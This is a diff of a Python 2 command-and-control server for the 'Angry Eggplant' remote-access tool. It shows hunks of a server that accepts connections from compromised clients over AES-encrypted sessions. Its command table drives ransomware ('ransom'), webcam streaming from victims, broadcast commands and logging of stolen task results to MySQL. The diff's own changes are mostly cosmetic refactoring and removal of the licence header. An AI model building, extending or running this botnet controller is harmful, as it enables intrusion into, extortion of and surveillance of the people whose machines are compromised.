@@ -1,28 +1,4 @@
 #!/usr/bin/python
-#
-#    Copyright (c) 2017 Daniel Vega-Myhre
-#
-#    Permission is hereby granted, free of charge, to any person obtaining a copy
-#    of this software and associated documentation files (the "Software"), to deal
-#    in the Software without restriction, including without limitation the rights
-#    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-#    copies of the Software, and to permit persons to whom the Software is
-#    furnished to do so, subject to the following conditions:
-#
-#    THE ABOVE COPYRIGHT NOTICE AND THIS PERMISSION NOTICE SHALL BE INCLUDED IN ALL
-#    COPIES OR SUBSTANTIAL PORTIONS OF THE SOFTWARE.
-#
-#    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-#    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-#    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
-#
-#    IN NO EVENT SHALL THE
-#    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-#    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-#    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-#    SOFTWARE.
-
-
 
 from __future__ import print_function
 
@@ -30,7 +6,18 @@ for package in ['os', 'sys', 'cv2', 'json', 'time', 'numpy', 'Queue', 'pickle', 
     try:
         exec "import %s" % package in globals()
     except ImportError as e:
-        print
+        print("%s import error: %s" % (package, str(e)))
+
+
+# Decorator for making a function threaded
+def threaded(function):
+    @functools.wraps(function)
+    def _threaded(*args, **kwargs):
+        t = threading.Thread(target=function, args=args, kwargs=kwargs, name=time.time())
+        t.daemon = True
+        t.start()
+        return t
+    return _threaded
 
 
 class DatabaseError(Exception):
@@ -45,19 +32,15 @@ class ClientError(Exception):
     pass
 
 
-def threaded(function):
-    @functools.wraps(function)
-    def _threaded(*args, **kwargs):
-        t = threading.Thread(target=function, args=args, kwargs=kwargs, name=time.time())
-        t.daemon = True
-        t.start()
-        return t
-    return _threaded
-
-
 class Server(threading.Thread):
+    """
+    Angry Eggplant Server
+    """
 
     def __init__(self, port=1337, debug=True, **kwargs):
+        """
+        initiate a new Server instance
+        """
         super(Server, self).__init__()
         self.clients            = {}
         self.current_client     = None
@@ -76,8 +59,10 @@ class Server(threading.Thread):
         self._prompt            = None
         self._count             = 1
 
+
     def _prompt(self, data):
         return raw_input(self._prompt_color + self._prompt_style + '\n' + data + self._text_color + self._text_style)
+
 
     def _error(self, data):
         if self.current_client:
@@ -86,6 +71,7 @@ class Server(threading.Thread):
         else:
             with self._lock:
                 print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Server Error: ' + data + '\n')
+
 
     def _print(self, info):
         lock = self._lock if not self.current_client else self.current_client._lock
@@ -109,6 +95,7 @@ class Server(threading.Thread):
             with lock:
                 print('\n' + self._text_color + self._text_style + str(info) + '\n')
 
+
     def _return(self, data=None):
         if not self.current_client:
             with self._lock:
@@ -122,6 +109,7 @@ class Server(threading.Thread):
                     print('\n' + data + '\n')
                 else:
                     print(self.current_client.prompt, end="")
+
 
     def _init_session(self, port):
         try:
@@ -140,14 +128,15 @@ class Server(threading.Thread):
         except Exception as e:
             return "{} error: {}".format(self._get_handlers.func_name, str(e))
 
+
     def _get_config(self):
-        self._resources = '../resources' if os.path.isdir('../resources') else ''
         config = configparser.ConfigParser()
-        if os.path.isfile('../config.ini'):
-            _  = config.read('../config.ini')
+        if os.path.isfile('config.ini'):
+            _  = config.read('config.ini')
         else:
             raise ServerError("missing configuration file")
         return config
+
 
     def _get_commands(self):
         return {
@@ -163,7 +152,7 @@ class Server(threading.Thread):
             'ransom'        :   self.ransom_client,
             'results'       :   self.show_task_results,
             'save'          :   self.save_task_results,
-        'sendall'	    :   self.sendall_clients,
+            'sendall'	    :   self.sendall_clients,
             'settings'      :   self.display_settings,
             'webcam'        :   self.webcam_client
             }
@@ -190,6 +179,7 @@ class Server(threading.Thread):
         except Exception as e:
             self._error(str(e))
 
+
     def _get_client_from_connection(self, sock):
         try:
             if isinstance(sock, socket.socket):
@@ -208,6 +198,7 @@ class Server(threading.Thread):
         while True:
             connection, address = self._socket.accept()
             request = self.recv_client(connection=connection)
+
 
     def _shell_handler(self, connection):
         client  = Client(connection, name=self._count)
@@ -242,11 +233,13 @@ class Server(threading.Thread):
         else:
             self._return("warning: %s received invalid input type (expected {}, receieved {})" % (dict, type(task)))
 
+
     def _encrypt(self, data, key):
         cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB)
         ciphertext, tag = cipher.encrypt_and_digest(data)
         output = b''.join((cipher.nonce, tag, ciphertext))
         return base64.b64encode(output)
+
 
     def _decrypt(self, data, key):
         data = cStringIO.StringIO(base64.b64decode(data))
@@ -256,6 +249,7 @@ class Server(threading.Thread):
             return cipher.decrypt_and_verify(ciphertext, tag)
         except:
             return cipher.decrypt(ciphertext) + '\n(Authentication check failed - transmission may have been compromised)\n'
+
 
     def send_client(self, command, client_id=None):
         if str(client_id).isdigit() and int(client_id) in self.clients:
@@ -273,6 +267,7 @@ class Server(threading.Thread):
         except Exception as e:
             time.sleep(1)
             self._error(str(e))
+
 
     def recv_client(self, client_id=None, connection=None):
         if client_id:
@@ -308,8 +303,10 @@ class Server(threading.Thread):
                 self._active.set()
                 self.run()
 
+
     def get_clients(self):
         return [v for v in self.clients.values()]
+
 
     def select_client(self, client_id):
         if not str(client_id).isdigit() or int(client_id) not in self.clients:
@@ -323,6 +320,7 @@ class Server(threading.Thread):
             print(colorama.Fore.CYAN + colorama.Style.BRIGHT + "\n\n\t[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Client {} selected".format(client.name, client.address[0]) + self._text_color + self._text_style)
             self.current_client._active.set()
             return self.current_client.run()
+
 
     def background_client(self, client_id=None):
         if not client_id:
@@ -339,6 +337,7 @@ class Server(threading.Thread):
                 self.send_client(msg, client.name)
             except Exception as e:
                 self._error('{} returned error: {}'.format(self.sendall_clients.func_name, str(e)))
+
 
     def remove_client(self, client_id):
         if not str(client_id).isdigit() or int(client_id) not in self.clients:
@@ -378,6 +377,7 @@ class Server(threading.Thread):
             except Exception as e:
                 self._error('{} failed with error: {}'.format(self.remove_client.func_name, str(e)))
 
+
     def list_clients(self):
         lock = self._lock if not self.current_client else self.current_client._lock
         with lock:
@@ -385,6 +385,7 @@ class Server(threading.Thread):
             for k, v in self.clients.items():
                 print(self._text_color + colorama.Style.BRIGHT + '{:>3}'.format(k) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format(v.info['id']) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format(v.session) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format(v.address[0]))
             print('\n')
+
 
     def quit_server(self):
         if self.prompt('Quiting server - keep clients alive? (y/n): ').startswith('y'):
@@ -397,6 +398,7 @@ class Server(threading.Thread):
         _ = os.popen("taskkill /pid {} /f".format(os.getpid()) if os.name is 'nt' else "kill -9 {}".format(os.getpid())).read()
         print('Exiting...')
         sys.exit(0)
+
 
     def _execute_sql(self, cursor, query):
         try:
@@ -421,15 +423,18 @@ class Server(threading.Thread):
         except Exception as e:
             return "{} error: {}".format(self._execute_sql.func_name, str(e))
 
+
     def _eval_code(self, code):
         try:
             return eval(code)
         except Exception as e:
             return "Error: %s" % str(e)
 
+
     def prompt(self, data):
         with self._lock:
             return raw_input(self._prompt_color + self._prompt_style + '\n' + bytes(data).rstrip())
+
 
     def display(self, info):
         print('\n')
@@ -448,6 +453,7 @@ class Server(threading.Thread):
                 print(self._text_color + self._text_style + str(info))
         else:
             self._error("{} error: invalid data type '{}'".format(self.display.func_name, type(info)))
+
 
     def display_settings(self, args=None):
         if not args:
@@ -488,6 +494,7 @@ class Server(threading.Thread):
                 else:
                     print("usage: settings text <option> [value]")
 
+
     def show_usage_help(self, info=None):
         column1 = 'command <arg>'
         column2 ='description'
@@ -497,6 +504,7 @@ class Server(threading.Thread):
         print('\n' + self._text_color + colorama.Style.BRIGHT + column1.center(max_key) + column2.center(max_val))
         for key in sorted(info):
             print(self._text_color + self._text_style + key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2))
+
 
     def webcam_client(self, args=''):
         try:
@@ -553,6 +561,7 @@ class Server(threading.Thread):
         except Exception as e:
             self._error("webcam stream failed with error: {}".format(str(e)))
 
+
     def ransom_client(self, args=None):
         if self.current_client:
             if 'decrypt' in str(args):
@@ -562,6 +571,7 @@ class Server(threading.Thread):
                 return
         else:
             self._error("No client selected")
+
 
     def new_task_id(self, command, client_id=None):
         if str(client_id).isdigit() and int(client_id) in self.clients:
@@ -575,6 +585,7 @@ class Server(threading.Thread):
         except Exception as e:
             self._error("{} returned error: {}".format(self.new_task_id.func_name, str(e)))
 
+
     def show_task_results(self, client_id=None):
         if str(client_id).isdigit() and int(client_id) in self.clients:
             client = self.clients[int(client_id)]
@@ -586,6 +597,7 @@ class Server(threading.Thread):
             return self.database_query("SELECT * FROM tbl_tasks WHERE session='{}'".format(client.session).replace("Array\n(", "").replace("\n)", ""), display=False)
         except Exception as e:
             self._error("{} returned error: {}".format(self.show_task_results.func_name, str(e)))
+
 
     def save_task_results(self, task=None):
         try:
@@ -608,6 +620,7 @@ class Server(threading.Thread):
         except Exception as e:
             self._error("{} returned error: {}".format(self.save_task_results.func_name, str(e)))
 
+
     def database_query(self, query, display=False):
         try:
             self.database.reconnect()
@@ -622,6 +635,7 @@ class Server(threading.Thread):
             self.database.reconnect()
         except Exception as e:
             self._error("{} error: {}".format(self.database_query.func_name, str(e)))
+
 
     def database_procedure(self, procedure, args=[], display=False):
         try:
@@ -638,8 +652,10 @@ class Server(threading.Thread):
         except mysql.connector.InterfaceError:
             pass
 
+
     def run(self):
         self._active.set()
+        self._init_session()
         while True:
             try:
                 self._active.wait()
@@ -684,6 +700,12 @@ class Client(threading.Thread):
         self.session        = self._session()
         self.connection.setblocking(True)
 
+
+    def _error(self, data):
+        with self._lock:
+            print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Client {} Error: '.format(self.name) + bytes(data) + '\n')
+
+
     def _config(self, **kwargs):
         for k,v in kwargs.items():
             try:
@@ -700,12 +722,14 @@ class Client(threading.Thread):
             except Exception as e:
                 self._error(str(e))
 
+
     def _kill(self):
         self._active.clear()
         server.remove_client(self.name)
         server.current_client = None
         server._active.set()
         server.run()
+
 
     def _info(self):
         buf  = ''
@@ -729,6 +753,7 @@ class Client(threading.Thread):
                     pass
         return data
 
+
     def _session_key(self):
         try:
             p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
@@ -742,6 +767,7 @@ class Client(threading.Thread):
         except Exception as e:
             self._error("{} returned error: {}".format(self._session_key, str(e)))
             self._kill()
+
 
     def _session(self):
         try:
@@ -762,13 +788,11 @@ class Client(threading.Thread):
         except Exception as e2:
             self._error(str(e2))
 
-    def _error(self, data):
-        with self._lock:
-            print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Client {} Error: '.format(self.name) + bytes(data) + '\n')
 
     def prompt(self, data):
         with self._lock:
             return raw_input(server._prompt_color + server._prompt_style + '\n' + bytes(data).rstrip())
+
 
     def run(self):
         while True:
@@ -827,6 +851,7 @@ def main():
         parser.print_help()
         print("\n" + colorama.Fore.RESET + colorama.Style.NORMAL)
         sys.exit(0)
+
 
 if __name__ == '__main__':
     colorama.init()
